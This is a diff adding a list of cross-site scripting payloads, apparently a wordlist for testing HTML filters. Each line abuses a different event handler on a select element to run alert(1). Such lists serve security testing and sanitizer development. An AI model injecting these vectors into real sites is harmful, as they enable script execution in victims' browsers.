@@ -1,0 +1,36 @@
+<select autofocus onfocus=alert(1)>
+<select autofocus onfocusin=alert(1)>
+<select draggable="true" ondrag="alert(1)">test</select>
+<select draggable="true" ondragend="alert(1)">test</select>
+<select draggable="true" ondragenter="alert(1)">test</select>
+<select draggable="true" ondragleave="alert(1)">test</select>
+<select draggable="true" ondragstart="alert(1)">test</select>
+<select id=x tabindex=1 onactivate=alert(1)></select>
+<select id=x tabindex=1 onbeforeactivate=alert(1)></select>
+<select onbeforecopy="alert(1)" contenteditable>test</select>
+<select onbeforecut="alert(1)" contenteditable>test</select>
+<select onbeforepaste="alert(1)" contenteditable>test</select>
+<select onclick="alert(1)">test</select>
+<select oncontextmenu="alert(1)">test</select>
+<select oncopy="alert(1)" contenteditable>test</select>
+<select oncut="alert(1)" contenteditable>test</select>
+<select ondblclick="alert(1)">test</select>
+<select onkeydown="alert(1)" contenteditable>test</select>
+<select onkeypress="alert(1)" contenteditable>test</select>
+<select onkeyup="alert(1)" contenteditable>test</select>
+<select onmousedown="alert(1)">test</select>
+<select onmouseenter="alert(1)">test</select>
+<select onmouseleave="alert(1)">test</select>
+<select onmousemove="alert(1)">test</select>
+<select onmouseout="alert(1)">test</select>
+<select onmouseover="alert(1)">test</select>
+<select onmouseup="alert(1)">test</select>
+<select onpaste="alert(1)" contenteditable>test</select>
+<style>:target {color: red;}</style><select id=x style="transition:color 10s" ontransitioncancel=alert(1)></select>
+<style>:target {color:red;}</style><select id=x style="transition:color 1s" ontransitionend=alert(1)></select>
+<style>:target {transform: rotate(180deg);}</style><select id=x style="transition:transform 2s" ontransitionrun=alert(1)></select>
+<style>@keyframes slidein {}</style><select style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></select>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><select id=x style="position:absolute;" onanimationcancel="alert(1)"></select>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationend="alert(1)"></select>
+<style>@keyframes x{}</style><select style="animation-name:x" onanimationstart="alert(1)"></select>
+<svg><select onload=alert(1)></select>
